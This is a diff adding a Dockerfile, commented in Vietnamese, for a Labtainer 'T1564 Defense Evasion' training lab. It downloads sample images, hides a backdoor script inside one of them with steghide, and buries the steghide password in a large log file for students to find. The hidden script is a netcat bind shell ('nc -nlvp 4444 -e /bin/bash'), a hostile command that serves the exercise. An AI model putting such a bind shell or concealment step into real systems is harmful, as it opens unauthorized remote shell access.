@@ -1,0 +1,77 @@
+# Labtainer Dockerfile for T1564 Defense Evasion Lab
+ARG registry
+FROM $registry/labtainer.network2
+
+ARG lab
+ARG labdir
+ARG imagedir
+ARG user_name
+ARG password
+ARG apt_source
+ARG version
+LABEL version=$version
+ENV APT_SOURCE $apt_source
+
+# Cài đặt các công cụ cần thiết
+RUN apt-get update && apt-get install -y \
+    wget \
+    steghide \
+    python3 \
+    python3-pip \
+    curl \
+    vim \
+    zip && \
+    apt-get clean
+
+# Tạo user cho bài lab
+RUN useradd -ms /bin/bash $user_name && \
+    echo "$user_name:$password" | chpasswd && \
+    adduser $user_name sudo
+
+# Cấu hình quyền và thiết lập môi trường
+USER root
+ENV HOME /home/$user_name
+
+# Tạo thư mục "image" và tải 10 file ảnh vào thư mục này
+RUN mkdir -p /home/$user_name/image && \
+    wget -O /home/$user_name/image/image1.jpg https://upload.wikimedia.org/wikipedia/commons/5/52/VIY3_GPR.jpg && \
+    wget -O /home/$user_name/image/image2.jpg https://upload.wikimedia.org/wikipedia/commons/2/25/TDEM.jpg && \
+    wget -O /home/$user_name/image/image3.jpg https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Schematic_view_of_a_successful_reforestation_programme_-_Gcb15498-fig-0005-m.webp/1200px-Schematic_view_of_a_successful_reforestation_programme_-_Gcb15498-fig-0005-m.webp.png?20221015134238 && \
+    wget -O /home/$user_name/image/image4.jpg https://upload.wikimedia.org/wikipedia/commons/thumb/9/92/Umspannwerk-Pulverdingen_380kV-Trennschalter.jpg/1200px-Umspannwerk-Pulverdingen_380kV-Trennschalter.jpg?20200825104000 && \
+    wget -O /home/$user_name/image/image5.jpg https://upload.wikimedia.org/wikipedia/commons/a/a4/1_HaZQlGbhFq98WrK212Ieuw.jpg && \
+    wget -O /home/$user_name/image/image6.jpg https://upload.wikimedia.org/wikipedia/commons/1/19/Rosularia_05660.jpg && \
+    wget -O /home/$user_name/image/image8.jpg https://upload.wikimedia.org/wikipedia/commons/e/e5/Metropolitan_Opera_House%2C_a_concert_by_pianist_Josef_Hofmann_-_NARA_541890_-_Edit.jpg && \
+    wget -O /home/$user_name/image/image9.jpg https://upload.wikimedia.org/wikipedia/commons/1/19/Rosularia_05660.jpg && \
+    wget -O /home/$user_name/image/image10.jpg https://upload.wikimedia.org/wikipedia/commons/e/e5/Metropolitan_Opera_House%2C_a_concert_by_pianist_Josef_Hofmann_-_NARA_541890_-_Edit.jpg
+
+# Tạo file "malicious_code.sh" chứa mã backdoor
+RUN echo "#!/bin/bash\nnc -nlvp 4444 -e /bin/bash" > /home/$user_name/image/malicious_code.sh && \
+    chmod +x /home/$user_name/image/malicious_code.sh
+
+# Nhúng file "malicious_code.sh" vào file ảnh thứ 7 (image6.jpg)
+RUN steghide embed -cf /home/$user_name/image/image6.jpg \
+                   -ef /home/$user_name/image/malicious_code.sh \
+                   -p "hocbong2025" \
+                   -sf /home/$user_name/image/image7.jpg && \
+    rm -f /home/$user_name/image/malicious_code.sh
+
+# Tạo file log lớn chứa thông tin mật khẩu
+RUN mkdir -p /home/$user_name/log && \
+    for i in $(seq 1 1000); do echo "[INFO] Log entry $i: Normal operation log entry $i." >> /home/$user_name/log/daily.log; done && \
+    echo "[ALERT] Steganography tool used to hide data with password 'hocbong2025'." >> /home/$user_name/log/daily.log && \
+    for i in $(seq 1001 2000); do echo "[INFO] Log entry $i: Normal operation log entry $i." >> /home/$user_name/log/daily.log; done
+
+
+# Đặt quyền sở hữu thư mục cho user bài lab
+RUN chown -R $user_name:$user_name /home/$user_name/image && \
+    chown -R $user_name:$user_name /home/$user_name/log
+
+# Thêm các file cần thiết
+ADD $labdir/$imagedir/home_tar/home.tar $HOME
+RUN rm -f $HOME/home.tar
+ADD $labdir/$lab.tar.gz $HOME
+
+# Chạy script monitor và chuyển quyền user
+USER root
+CMD ["/bin/bash", "-c", "/monitor_files.sh & exec /bin/bash"]
+
